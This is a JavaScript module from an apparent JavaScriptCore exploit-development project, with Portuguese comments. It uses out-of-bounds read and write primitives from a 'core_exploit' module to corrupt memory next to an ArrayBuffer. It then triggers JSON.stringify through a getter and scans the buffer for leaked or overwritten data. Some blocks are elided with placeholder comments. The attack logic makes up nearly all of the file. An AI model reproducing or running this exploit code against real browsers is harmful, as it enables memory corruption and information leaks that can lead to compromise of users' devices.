// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierWriteAnalysis";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    oob_writes_detected: [], stringifier_output_length: 0
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xABABABAB;
const OOB_AB_SNOOP_AREA_BYTES = 0x800; // Sondar os primeiros 2KB

// Objeto global para tentar vazar o endereço (ou dados relacionados)
let global_target_object_for_leak;

class CheckpointForStringifierWriteAnalysis {
    constructor(id) {
        this.id_marker = `StrWriteAnalysisChkpt-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierWriteAnalysis_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Reset
            success: false, message: "Getter chamado, analisando escrita do Stringifier.",
            error: null, oob_writes_detected: [], stringifier_output_length: 0, details:""
        };
        let details_log = [];
        let anomalia_encontrada = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis.");
            }

            // 1. Preencher oob_array_buffer_real com um padrão
            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_limit = Math.min(OOB_AB_SNOOP_AREA_BYTES, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)} até ${toHex(fill_limit)}.`);

            // 2. Criar objeto de stress para o JSON.stringify interno
            //    Incluir o global_target_object_for_leak para ver se ele (ou seu endereço) é vazado.
            global_target_object_for_leak = { 
                secret_id: "OBJETO_ALVO_SECRETO_PARA_LEAK", 
                unique_val: Date.now(),
                some_buffer: new Uint8Array(32).fill(0x77) // Para ver se conteúdos de buffer são vazados
            };
            
            let stress_obj = {
                title: "StressObjectForStringifier",
                target: global_target_object_for_leak,
                long_str_A: "STR_A_" + "A".repeat(150) + "_END_A",
                num_array: Array.from({length: 15}, (_, k) => (0x11000000 + k*0x10101)),
                nested: {
                    sub_str: "SUB_STR_" + "B".repeat(100) + "_END_SUB",
                    sub_target_ref: global_target_object_for_leak
                },
                bool_true: true, bool_false: false, val_null: null,
                long_str_C: "STR_C_" + "C".repeat(180) + "_END_C"
            };
             // stress_obj.self_ref = stress_obj; // Evitar ciclo por enquanto

            details_log.push(`Objeto de stress (contendo global_target_object_for_leak) criado.`);

            // 3. Chamar JSON.stringify internamente
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_out_len = 0;
            try {
                let internal_json_out = JSON.stringify(stress_obj);
                internal_json_out_len = internal_json_out.length;
                details_log.push(`Stringify interno completado. Output length: ${internal_json_out_len}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_json_out_len}`, "info", FNAME_GETTER);
            } catch (e_json_int) {
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                current_test_results.error = `Erro stringify interno: ${e_json_int.message}`;
                anomalia_encontrada = true; // Erro incomum é uma anomalia
            }
            current_test_results.stringifier_output_length = internal_json_out_len;

            // 4. Sondar o oob_array_buffer_real por alterações no padrão
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas/vazamentos do Stringifier...", "info", FNAME_GETTER);
            let snoop_hits = [];
            for (let offset = 0; (offset + 4) <= fill_limit; offset += 4) { // Ler DWORDS
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) {
                    try {
                        const val_trig = oob_read_absolute(offset, 4);
                        if (val_trig !== OOB_AB_FILL_PATTERN_U32) { // Mesmo o trigger alterou o padrão
                             snoop_hits.push({offset: toHex(offset), value: toHex(val_trig), note: "Gatilho"});
                        }
                    } catch(e){}
                    continue;
                }
                try {
                    const value_read = oob_read_absolute(offset, 4);
                    if (value_read !== OOB_AB_FILL_PATTERN_U32) {
                        const val64_context = (offset + 8 <= fill_limit) ? oob_read_absolute(offset, 8).toString(true) : "N/A (fim do buffer)";
                        const leak_msg = `ALTERAÇÃO oob_data[${toHex(offset)}]: ${toHex(value_read)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN_U32)}). Contexto 64bit: ${val64_context}`;
                        logS3(leak_msg, "leak", FNAME_GETTER);
                        snoop_hits.push({offset: toHex(offset), value_u32: toHex(value_read), value_u64_context: val64_context});
                        anomalia_encontrada = true;
                    }
                } catch (e_snoop) {}
            }
            current_test_results.oob_writes_detected = snoop_hits;
            if (snoop_hits.length > 0) {
                details_log.push(`${snoop_hits.length} DWORDS alterados encontrados em oob_array_buffer_real.`);
                logS3(`DENTRO DO GETTER: ${snoop_hits.length} DWORDS ALTERADOS ENCONTRADOS NO OOB_AB!`, "vuln", FNAME_GETTER);
            } else {
                details_log.push("Nenhuma alteração de padrão encontrada em oob_array_buffer_real após stringify interno.");
                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão encontrada no oob_array_buffer_real.", "good", FNAME_GETTER);
            }

            if (anomalia_encontrada) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (escritas inesperadas em oob_ab ou erro incomum no stringify interno) detectadas!";
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao estressar o Stringifier.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_stringifier_leak_analysis": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierWriteAnalysis.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_write_analysis_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierWriteAnalysisRunner";
    logS3(`--- Iniciando Teste de Análise de Escrita do Stringifier ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierWriteAnalysis(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ESCRITA STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ESCRITA STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.oob_writes_detected && current_test_results.oob_writes_detected.length > 0) {
            logS3("--- Dados Alterados/Vazados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.oob_writes_detected.forEach(item => { // item é objeto {offset, value_u32, value_u64_context}
                logS3(`  Offset ${item.offset}: U32=${item.value_u32}, Contexto U64=${item.value_u64_context}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    global_target_object_for_leak = null;
    logS3(`--- Teste de Análise de Escrita do Stringifier Concluído ---`, "test", FNAME_TEST_RUNNER);
}
